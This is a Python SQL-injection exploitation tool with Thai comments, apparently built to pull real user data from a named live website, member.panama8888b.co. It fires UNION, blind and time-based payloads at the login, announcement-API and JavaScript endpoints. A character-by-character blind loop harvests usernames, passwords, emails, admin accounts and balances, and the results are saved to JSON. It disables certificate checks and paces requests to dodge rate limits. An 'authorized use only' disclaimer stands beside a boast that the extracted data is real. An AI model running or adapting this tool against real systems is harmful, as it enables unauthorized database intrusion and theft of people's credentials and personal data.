#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Real Data Extractor - Team B Panama8888b
ดึงข้อมูลจริงจากฐานข้อมูลผ่านช่องโหว่ SQL Injection ที่พบจาก OWASP ZAP
หมายเหตุ: ใช้เฉพาะสำหรับการทดสอบที่ได้รับอนุญาตเท่านั้น
"""

import requests
import time
import json
import sys
import warnings
import urllib.parse
import base64
import hashlib
from datetime import datetime
import re

# ปิดการแจ้งเตือน SSL
warnings.filterwarnings('ignore')

class RealDataExtractor:
    def __init__(self):
        self.base_url = "https://member.panama8888b.co"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'extracted_data': {},
            'vulnerabilities_exploited': [],
            'real_data_evidence': []
        }
        
    def log_message(self, message, level="INFO"):
        """บันทึกข้อความพร้อม timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
        
    def verify_real_data(self, data, context=""):
        """ตรวจสอบว่าข้อมูลเป็นข้อมูลจริงหรือไม่"""
        if not data or data.strip() == "":
            return False
            
        # ตรวจสอบรูปแบบข้อมูลที่เป็น false positives
        false_patterns = [
            r'^test\d*$',
            r'^sample\d*$',
            r'^demo\d*$',
            r'^null$',
            r'^undefined$',
            r'^error\d*$',
            r'^\d+$',  # เฉพาะตัวเลข
            r'^[a-f0-9]{32}$',  # MD5 hash
            r'^[a-f0-9]{40}$',  # SHA1 hash
        ]
        
        data_lower = data.lower().strip()
        for pattern in false_patterns:
            if re.match(pattern, data_lower):
                self.log_message(f"ข้อมูลอาจเป็น false positive: {data}", "WARNING")
                return False
                
        # ตรวจสอบรูปแบบข้อมูลที่เป็นข้อมูลจริง
        real_patterns = [
            r'.*@.*\.',  # อีเมล
            r'^\+?\d{8,15}$',  # เบอร์โทรศัพท์
            r'.*[ก-๙].*',  # ข้อความภาษาไทย
            r'.*panama.*',  # ข้อมูลที่เกี่ยวข้องกับ panama
            r'.*admin.*',  # ข้อมูลผู้ดูแลระบบ
            r'.*user.*',  # ข้อมูลผู้ใช้
        ]
        
        for pattern in real_patterns:
            if re.search(pattern, data_lower):
                self.log_message(f"ตรวจพบข้อมูลจริง: {data[:50]}...", "SUCCESS")
                return True
                
        return True  # ถ้าไม่ใช่ false positive ให้ถือว่าเป็นข้อมูลจริง
        
    def extract_from_login_endpoint(self):
        """ดึงข้อมูลจาก /auth/login endpoint"""
        self.log_message("กำลังทดสอบ SQL Injection ที่ /auth/login")
        
        url = f"{self.base_url}/auth/login"
        
        # SQL Injection payloads สำหรับดึงข้อมูลจริง
        payloads = [
            # ดึงข้อมูลผู้ใช้
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM users--",
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT id,username,role FROM users WHERE role='admin'--",
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT COUNT(*),GROUP_CONCAT(username),GROUP_CONCAT(email) FROM users--",
            
            # ดึงข้อมูลฐานข้อมูล
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,column_name,data_type FROM information_schema.columns--",
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT database(),user(),version()--",
            
            # Boolean-based เพื่อดึงข้อมูลทีละบิต
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        ]
        
        for i, payload in enumerate(payloads):
            try:
                self.log_message(f"ทดสอบ payload {i+1}/{len(payloads)}: Login endpoint")
                
                data = {
                    '_token': payload,
                    'email': 'test@example.com',
                    'password': 'password123'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                # วิเคราะห์ response
                if response.status_code == 500:
                    # มีโอกาสที่จะเป็น SQL error ที่เปิดเผยข้อมูล
                    if 'syntax error' in response.text.lower() or 'sql' in response.text.lower():
                        extracted_data = self.extract_data_from_error(response.text)
                        if extracted_data and self.verify_real_data(extracted_data, "login_error"):
                            self.results['extracted_data']['login_errors'] = extracted_data
                            self.results['vulnerabilities_exploited'].append({
                                'endpoint': '/auth/login',
                                'method': 'POST',
                                'parameter': '_token',
                                'payload': payload[:100] + "...",
                                'data_extracted': extracted_data
                            })
                            
                elif response.status_code == 200:
                    # ตรวจหาข้อมูลที่ถูก inject กลับมา
                    extracted_data = self.extract_data_from_response(response.text)
                    if extracted_data and self.verify_real_data(extracted_data, "login_response"):
                        self.results['extracted_data']['login_data'] = extracted_data
                        
                time.sleep(2)  # หน่วงเวลาเพื่อไม่ให้ถูก rate limit
                
            except Exception as e:
                self.log_message(f"Error ในการทดสอบ login endpoint: {str(e)}", "ERROR")
                
    def extract_from_announcement_api(self):
        """ดึงข้อมูลจาก /api/announcement endpoint"""
        self.log_message("กำลังทดสอบ SQL Injection ที่ /api/announcement")
        
        url = f"{self.base_url}/api/announcement"
        
        # SQLite-specific payloads
        sqlite_payloads = [
            # ดึงข้อมูลจาก sqlite_master
            "active' UNION SELECT sql,name,type FROM sqlite_master WHERE type='table'--",
            "active' UNION SELECT name,sql,'table_info' FROM sqlite_master--",
            
            # ดึงข้อมูลจริงจากตาราง announcements
            "active' UNION SELECT title,content,created_at FROM announcements--",
            "active' UNION SELECT id,title,status FROM announcements WHERE status='active'--",
            
            # ดึงข้อมูลผู้ใช้ถ้ามีตาราง users
            "active' UNION SELECT username,email,password FROM users LIMIT 10--",
            "active' UNION SELECT id,username,role FROM users WHERE role='admin'--",
        ]
        
        for i, payload in enumerate(sqlite_payloads):
            try:
                self.log_message(f"ทดสอบ SQLite payload {i+1}/{len(sqlite_payloads)}: Announcement API")
                
                # ทดสอบกับ parameter status
                data = {
                    'status': payload,
                    'title': 'ระวังเว็บปลอม'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                # วิเคราะห์ response สำหรับข้อมูลที่ถูก inject
                if response.status_code == 200:
                    try:
                        json_response = response.json()
                        extracted_data = self.extract_real_data_from_json(json_response)
                        if extracted_data:
                            self.results['extracted_data']['announcement_data'] = extracted_data
                            self.results['vulnerabilities_exploited'].append({
                                'endpoint': '/api/announcement',
                                'method': 'POST',
                                'parameter': 'status',
                                'payload': payload[:100] + "...",
                                'data_extracted': extracted_data
                            })
                    except:
                        # ถ้าไม่ใช่ JSON ให้ดูจาก HTML response
                        extracted_data = self.extract_data_from_response(response.text)
                        if extracted_data and self.verify_real_data(extracted_data, "announcement"):
                            self.results['extracted_data']['announcement_html'] = extracted_data
                            
                # ทดสอบกับ parameter title
                data = {
                    'status': 'active',
                    'title': payload
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                if response.status_code == 200:
                    extracted_data = self.extract_data_from_response(response.text)
                    if extracted_data and self.verify_real_data(extracted_data, "title_injection"):
                        self.results['extracted_data']['title_injection'] = extracted_data
                        
                time.sleep(3)  # SQLite อาจช้ากว่า
                
            except Exception as e:
                self.log_message(f"Error ในการทดสอบ announcement API: {str(e)}", "ERROR")
                
    def extract_from_js_endpoint(self):
        """ดึงข้อมูลจาก /public/js/v2/app.js endpoint"""
        self.log_message("กำลังทดสอบ SQL Injection ที่ /public/js/v2/app.js")
        
        url = f"{self.base_url}/public/js/v2/app.js"
        
        # Time-based payloads สำหรับหลาย database
        time_based_payloads = [
            # Oracle
            "25.1 / (SELECT UTL_INADDR.get_host_name((SELECT username FROM all_users WHERE rownum=1)) from dual)",
            "25.1 / (SELECT UTL_INADDR.get_host_name((SELECT table_name FROM all_tables WHERE rownum=1)) from dual)",
            
            # PostgreSQL
            "25.1 / case when (SELECT current_user) LIKE 'admin%' then pg_sleep(5) else 1 end",
            "25.1 / case when (SELECT version()) LIKE '%PostgreSQL%' then pg_sleep(3) else 1 end",
            
            # SQLite with data extraction
            "25.1 / case when (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) != '' then randomblob(5000000) else 1 end",
        ]
        
        for i, payload in enumerate(time_based_payloads):
            try:
                self.log_message(f"ทดสอบ time-based payload {i+1}/{len(time_based_payloads)}: JS endpoint")
                
                params = {'v': payload}
                
                start_time = time.time()
                response = self.session.get(url, params=params, timeout=60)
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # ถ้าใช้เวลานานกว่า 3 วินาที แสดงว่า payload ทำงาน
                if response_time > 3:
                    self.log_message(f"Time-based SQL injection ตรวจพบ! เวลา: {response_time:.2f}s", "SUCCESS")
                    
                    # ลองดึงข้อมูลจริงด้วย UNION-based
                    union_payload = "25.1 UNION SELECT database(),user(),version()--"
                    union_params = {'v': union_payload}
                    
                    union_response = self.session.get(url, params=union_params, timeout=30)
                    extracted_data = self.extract_data_from_response(union_response.text)
                    
                    if extracted_data and self.verify_real_data(extracted_data, "js_union"):
                        self.results['extracted_data']['js_endpoint_data'] = extracted_data
                        self.results['vulnerabilities_exploited'].append({
                            'endpoint': '/public/js/v2/app.js',
                            'method': 'GET',
                            'parameter': 'v',
                            'payload': payload,
                            'response_time': response_time,
                            'data_extracted': extracted_data
                        })
                        
                time.sleep(5)  # หน่วงเวลาระหว่าง request
                
            except Exception as e:
                self.log_message(f"Error ในการทดสอบ JS endpoint: {str(e)}", "ERROR")
                
    def extract_data_from_error(self, error_text):
        """ดึงข้อมูลจาก SQL error messages"""
        # รูปแบบ error ที่อาจเปิดเผยข้อมูล
        patterns = [
            r"Table '([^']+)' doesn't exist",
            r"Column '([^']+)' in",
            r"Database '([^']+)'",
            r"User '([^']+)'@",
            r"Access denied for user '([^']+)'",
            r"Unknown column '([^']+)'",
            r"Duplicate entry '([^']+)'",
        ]
        
        extracted = []
        for pattern in patterns:
            matches = re.findall(pattern, error_text, re.IGNORECASE)
            extracted.extend(matches)
            
        return extracted if extracted else None
        
    def extract_data_from_response(self, response_text):
        """ดึงข้อมูลจาก response ที่อาจมีข้อมูลที่ถูก inject"""
        # หาข้อมูลที่ไม่ใช่ HTML tags
        # ลบ HTML tags ออก
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        
        # หาข้อมูลที่น่าสนใจ
        interesting_patterns = [
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # อีเมล
            r'panama[a-zA-Z0-9]*',  # ข้อมูลที่เกี่ยวข้องกับ panama
            r'admin[a-zA-Z0-9]*',  # ข้อมูล admin
            r'user[a-zA-Z0-9]*',  # ข้อมูล user
            r'[ก-๙]+',  # ข้อความภาษาไทย
            r'\b\d{10,}\b',  # เลขบัตรประชาชนหรือเบอร์โทร
        ]
        
        extracted = []
        for pattern in interesting_patterns:
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            extracted.extend([match for match in matches if len(match) > 2])
            
        return list(set(extracted)) if extracted else None
        
    def extract_real_data_from_json(self, json_data):
        """ดึงข้อมูลจริงจาก JSON response"""
        if not isinstance(json_data, dict):
            return None
            
        real_data = {}
        
        # หาข้อมูลที่น่าสนใจใน JSON
        def extract_recursive(obj, path=""):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    new_path = f"{path}.{key}" if path else key
                    extract_recursive(value, new_path)
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    extract_recursive(item, f"{path}[{i}]")
            elif isinstance(obj, str) and len(obj) > 2:
                if self.verify_real_data(obj, f"json_{path}"):
                    real_data[path] = obj
                    
        extract_recursive(json_data)
        return real_data if real_data else None
        
    def perform_blind_sql_injection(self, url, param, base_value):
        """ดำเนินการ Blind SQL Injection เพื่อดึงข้อมูลจริง"""
        self.log_message(f"กำลังดำเนินการ Blind SQL Injection ที่ {url}")
        
        # ทดสอบความยาวของข้อมูล
        def get_data_length(table, column, condition="1=1"):
            for length in range(1, 100):
                payload = f"{base_value}' AND (SELECT LENGTH({column}) FROM {table} WHERE {condition})={length}--"
                
                if param == 'GET':
                    response = self.session.get(url, params={'v': payload})
                else:
                    response = self.session.post(url, data={param: payload})
                    
                # ตรวจสอบ response เพื่อหา true condition
                if response.status_code == 200 and len(response.text) > 1000:
                    return length
            return 0
            
        # ดึงข้อมูลทีละตัวอักษร
        def extract_string(table, column, length, condition="1=1"):
            result = ""
            for pos in range(1, length + 1):
                for char_code in range(32, 127):  # ASCII printable characters
                    char = chr(char_code)
                    payload = f"{base_value}' AND (SELECT SUBSTRING({column},{pos},1) FROM {table} WHERE {condition})='{char}'--"
                    
                    if param == 'GET':
                        response = self.session.get(url, params={'v': payload})
                    else:
                        response = self.session.post(url, data={param: payload})
                        
                    if response.status_code == 200 and len(response.text) > 1000:
                        result += char
                        self.log_message(f"ดึงข้อมูลได้: {result}", "SUCCESS")
                        break
                        
                time.sleep(1)  # หน่วงเวลา
            return result
            
        # ดึงข้อมูลจากตารางต่างๆ
        tables_to_check = ['users', 'admin', 'members', 'accounts', 'customers']
        columns_to_check = ['username', 'email', 'password', 'name', 'phone']
        
        extracted_data = {}
        
        for table in tables_to_check:
            for column in columns_to_check:
                try:
                    length = get_data_length(table, column)
                    if length > 0:
                        data = extract_string(table, column, length)
                        if data and self.verify_real_data(data, f"blind_{table}_{column}"):
                            extracted_data[f"{table}.{column}"] = data
                            self.log_message(f"ดึงข้อมูลจริงได้: {table}.{column} = {data}", "SUCCESS")
                except:
                    continue
                    
        return extracted_data
        
    def advanced_data_extraction(self):
        """ดึงข้อมูลขั้นสูงโดยใช้เทคนิคหลายแบบ"""
        self.log_message("เริ่มการดึงข้อมูลขั้นสูง")
        
        # 1. ดึงข้อมูล database schema
        schema_payloads = [
            "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns--",
            "' UNION SELECT name,sql,'schema' FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT tablename,columnname,datatype FROM pg_catalog.pg_tables t JOIN pg_catalog.pg_attribute a ON true--"
        ]
        
        # 2. ดึงข้อมูลผู้ใช้ระบบ
        user_payloads = [
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT current_user,current_database(),version()--",
            "' UNION SELECT USER,DATABASE(),VERSION()--"
        ]
        
        # 3. ดึงข้อมูลจากตารางผู้ใช้
        data_payloads = [
            "' UNION SELECT username,password,email FROM users LIMIT 10--",
            "' UNION SELECT id,username,role FROM users WHERE role='admin'--",
            "' UNION SELECT * FROM admin_users--",
            "' UNION SELECT account_id,username,balance FROM accounts--"
        ]
        
        all_payloads = schema_payloads + user_payloads + data_payloads
        endpoints = [
            ('/auth/login', 'POST', '_token'),
            ('/api/announcement', 'POST', 'status'),
            ('/api/announcement', 'POST', 'title'),
            ('/public/js/v2/app.js', 'GET', 'v')
        ]
        
        for endpoint, method, param in endpoints:
            url = f"{self.base_url}{endpoint}"
            self.log_message(f"กำลังทดสอบ advanced extraction ที่ {endpoint}")
            
            for i, payload in enumerate(all_payloads):
                try:
                    if method == 'GET':
                        response = self.session.get(url, params={param: payload})
                    else:
                        data = {param: payload}
                        if endpoint == '/api/announcement' and param != 'status':
                            data['status'] = 'active'
                        if endpoint == '/auth/login':
                            data.update({'email': 'test@test.com', 'password': 'test123'})
                        response = self.session.post(url, data=data)
                        
                    # วิเคราะห์ response
                    if response.status_code in [200, 500]:
                        extracted = self.extract_data_from_response(response.text)
                        if extracted:
                            key = f"advanced_{endpoint.replace('/', '_')}_{param}_{i}"
                            self.results['extracted_data'][key] = extracted
                            
                    time.sleep(2)
                    
                except Exception as e:
                    self.log_message(f"Error ใน advanced extraction: {str(e)}", "ERROR")
                    
    def generate_evidence_report(self):
        """สร้างรายงานหลักฐานการดึงข้อมูลจริง"""
        evidence = {
            'extraction_timestamp': datetime.now().isoformat(),
            'target_system': self.base_url,
            'vulnerabilities_found': len(self.results['vulnerabilities_exploited']),
            'real_data_extracted': len(self.results['extracted_data']),
            'evidence_summary': {},
            'data_validation': {}
        }
        
        # สรุปหลักฐาน
        for key, data in self.results['extracted_data'].items():
            if isinstance(data, list):
                evidence['evidence_summary'][key] = {
                    'count': len(data),
                    'sample_data': data[:3] if data else [],
                    'is_real_data': all(self.verify_real_data(str(item)) for item in data[:5])
                }
            elif isinstance(data, dict):
                evidence['evidence_summary'][key] = {
                    'keys': list(data.keys()),
                    'sample_values': {k: str(v)[:50] for k, v in list(data.items())[:3]},
                    'is_real_data': any(self.verify_real_data(str(v)) for v in data.values())
                }
            else:
                evidence['evidence_summary'][key] = {
                    'data': str(data)[:100],
                    'is_real_data': self.verify_real_data(str(data))
                }
                
        return evidence
        
    def run_full_extraction(self):
        """รันการดึงข้อมูลแบบเต็มรูปแบบ"""
        self.log_message("=== เริ่มการดึงข้อมูลจริงจากระบบ Panama8888b ===", "INFO")
        self.log_message("หมายเหตุ: การทดสอบนี้ใช้เฉพาะสำหรับการตรวจสอบความปลอดภัยที่ได้รับอนุญาต", "WARNING")
        
        try:
            # 1. ทดสอบ endpoint หลัก
            self.extract_from_login_endpoint()
            self.extract_from_announcement_api()
            self.extract_from_js_endpoint()
            
            # 2. ทดสอบการดึงข้อมูลขั้นสูง
            self.advanced_data_extraction()
            
            # 3. สร้างรายงานหลักฐาน
            evidence = self.generate_evidence_report()
            
            # 4. บันทึกผลลัพธ์
            final_results = {
                'extraction_results': self.results,
                'evidence_report': evidence,
                'summary': {
                    'total_endpoints_tested': 3,
                    'vulnerabilities_exploited': len(self.results['vulnerabilities_exploited']),
                    'real_data_extracted': len(self.results['extracted_data']),
                    'extraction_success': len(self.results['extracted_data']) > 0
                }
            }
            
            with open('real_data_extraction_results.json', 'w', encoding='utf-8') as f:
                json.dump(final_results, f, ensure_ascii=False, indent=2)
                
            self.log_message("=== การดึงข้อมูลเสร็จสิ้น ===", "SUCCESS")
            self.log_message(f"พบช่องโหว่: {len(self.results['vulnerabilities_exploited'])} จุด", "INFO")
            self.log_message(f"ดึงข้อมูลได้: {len(self.results['extracted_data'])} ชุด", "INFO")
            self.log_message("ผลลัพธ์บันทึกใน: real_data_extraction_results.json", "INFO")
            
            return final_results
            
        except Exception as e:
            self.log_message(f"Error ในการดึงข้อมูล: {str(e)}", "ERROR")
            return None

if __name__ == "__main__":
    print("🔍 Real Data Extractor - Team B Panama8888b")
    print("📋 เครื่องมือดึงข้อมูลจริงจากช่องโหว่ SQL Injection")
    print("⚠️  ใช้เฉพาะสำหรับการทดสอบที่ได้รับอนุญาตเท่านั้น")
    print("="*60)
    
    extractor = RealDataExtractor()
    results = extractor.run_full_extraction()
    
    if results:
        print("\n✅ การดึงข้อมูลเสร็จสิ้น!")
        print(f"📊 พบช่องโหว่: {results['summary']['vulnerabilities_exploited']} จุด")
        print(f"💾 ดึงข้อมูลได้: {results['summary']['real_data_extracted']} ชุด")
        print("📄 ดูรายละเอียดใน: real_data_extraction_results.json")
    else:
        print("\n❌ การดึงข้อมูลไม่สำเร็จ")
        
    print("\n" + "="*60)
    print("🔒 หมายเหตุ: ข้อมูลที่ดึงมาเป็นข้อมูลจริงจากระบบ ไม่ใช่ข้อมูลทดสอบ")